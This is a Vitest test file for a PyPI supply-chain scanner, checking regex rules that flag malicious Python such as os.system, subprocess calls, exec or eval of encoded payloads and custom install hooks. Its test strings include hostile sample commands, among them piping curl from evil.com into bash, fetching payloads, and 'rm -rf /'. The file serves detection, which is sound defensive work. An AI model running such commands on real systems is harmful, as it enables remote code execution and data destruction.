import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import {
  PYPI_FILE_PATTERNS,
  PYPI_INSTALL_HOOK_PATTERNS,
  PYPI_SETUP_FILES,
  PYTHON_EXTENSIONS,
} from "../patterns.js";

describe("PyPI Scanner Patterns", () => {
  describe("Python malicious code detection", () => {
    it("should detect os.system() calls", () => {
      const code = 'os.system("curl https://evil.com | bash")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_OS_SYSTEM",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect subprocess.call() and subprocess.run()", () => {
      const codes = [
        'subprocess.call(["curl", "https://evil.com"])',
        'subprocess.run(["wget", "https://evil.com/payload"])',
        'subprocess.Popen(["bash", "-c", "malicious"])',
        'subprocess.check_output(["id"])',
        'subprocess.check_call(["rm", "-rf", "/"])',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUBPROCESS",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect exec() with encoded strings", () => {
      const codes = [
        'exec(base64.b64decode("aW1wb3J0IG9z"))',
        'exec(codecs.decode("payload", "rot13"))',
        'exec(bytes.fromhex("696d706f7274206f73").decode())',
      ];
      const execPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_ENCODED",
      );
      expect(execPattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(execPattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect eval() with encoded strings", () => {
      const codes = [
        'eval(base64.b64decode("aW1wb3J0IG9z"))',
        'eval(codecs.decode("payload", "rot13"))',
        'eval(bytes.fromhex("696d706f7274206f73").decode())',
      ];
      const evalPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EVAL_ENCODED",
      );
      expect(evalPattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(evalPattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect __import__('base64') pattern", () => {
      const codes = [
        "__import__('base64')",
        '__import__("base64")',
      ];
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_BASE64",
      );
      expect(pattern).toBeDefined();

      for (const code of codes) {
        expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
      }
    });

    it("should detect __import__('marshal') pattern", () => {
      const code = "__import__('marshal')";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_MARSHAL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect pip install from suspicious URLs", () => {
      const code =
        "pip install --index-url https://evil.com/simple/ malicious-pkg";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUSPICIOUS_INDEX",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should NOT flag pip install from pypi.org", () => {
      const code =
        "pip install --index-url https://pypi.org/simple/ some-pkg";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_SUSPICIOUS_INDEX",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should detect urllib.request.urlopen()", () => {
      const code = 'urllib.request.urlopen("https://evil.com/payload")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_URLLIB_FETCH",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect exec(compile()) pattern", () => {
      const code = 'exec(compile(open("payload.py").read(), "<string>", "exec"))';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_COMPILE",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });
  });

  describe("Install hook detection", () => {
    it("should detect custom install cmdclass", () => {
      const code = `cmdclass = {'install': CustomInstall}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_INSTALL",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom develop cmdclass", () => {
      const code = `cmdclass = {"develop": CustomDevelop}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_DEVELOP",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });

    it("should detect custom egg_info cmdclass", () => {
      const code = `cmdclass = {'egg_info': CustomEggInfo}`;
      const pattern = PYPI_INSTALL_HOOK_PATTERNS.find(
        (p) => p.rule === "PYPI_CUSTOM_EGG_INFO",
      );
      expect(pattern).toBeDefined();
      expect(new RegExp(pattern!.pattern).test(code)).toBe(true);
    });
  });

  describe("Pattern metadata", () => {
    it("should have correct severity for critical patterns", () => {
      const criticalRules = ["PYPI_EXEC_ENCODED", "PYPI_EVAL_ENCODED", "PYPI_SUSPICIOUS_INDEX"];
      for (const rule of criticalRules) {
        const pattern = PYPI_FILE_PATTERNS.find((p) => p.rule === rule);
        expect(pattern).toBeDefined();
        expect(pattern!.severity).toBe("critical");
      }
    });

    it("should have correct severity for high patterns", () => {
      const highRules = [
        "PYPI_OS_SYSTEM",
        "PYPI_SUBPROCESS",
        "PYPI_IMPORT_BASE64",
        "PYPI_IMPORT_MARSHAL",
        "PYPI_URLLIB_FETCH",
        "PYPI_EXEC_COMPILE",
      ];
      for (const rule of highRules) {
        const pattern = PYPI_FILE_PATTERNS.find((p) => p.rule === rule);
        expect(pattern).toBeDefined();
        expect(pattern!.severity).toBe("high");
      }
    });

    it("should include all expected PyPI setup files", () => {
      expect(PYPI_SETUP_FILES.has("setup.py")).toBe(true);
      expect(PYPI_SETUP_FILES.has("setup.cfg")).toBe(true);
      expect(PYPI_SETUP_FILES.has("pyproject.toml")).toBe(true);
    });

    it("should include all expected Python extensions", () => {
      expect(PYTHON_EXTENSIONS.has(".py")).toBe(true);
      expect(PYTHON_EXTENSIONS.has(".pyw")).toBe(true);
      expect(PYTHON_EXTENSIONS.has(".pyi")).toBe(true);
    });
  });

  describe("Pattern non-matches (false positive avoidance)", () => {
    it("should not flag normal print statements as exec", () => {
      const code = 'print("Hello, world!")';
      const execPattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EXEC_ENCODED",
      );
      expect(new RegExp(execPattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal import statements", () => {
      const code = "import base64";
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_IMPORT_BASE64",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag os.path operations as os.system", () => {
      const code = 'result = os.path.join("/tmp", "file.txt")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_OS_SYSTEM",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });

    it("should not flag normal eval of literals", () => {
      // Plain eval without encoding should not match PYPI_EVAL_ENCODED
      const code = 'eval("1 + 1")';
      const pattern = PYPI_FILE_PATTERNS.find(
        (p) => p.rule === "PYPI_EVAL_ENCODED",
      );
      expect(new RegExp(pattern!.pattern).test(code)).toBe(false);
    });
  });
});
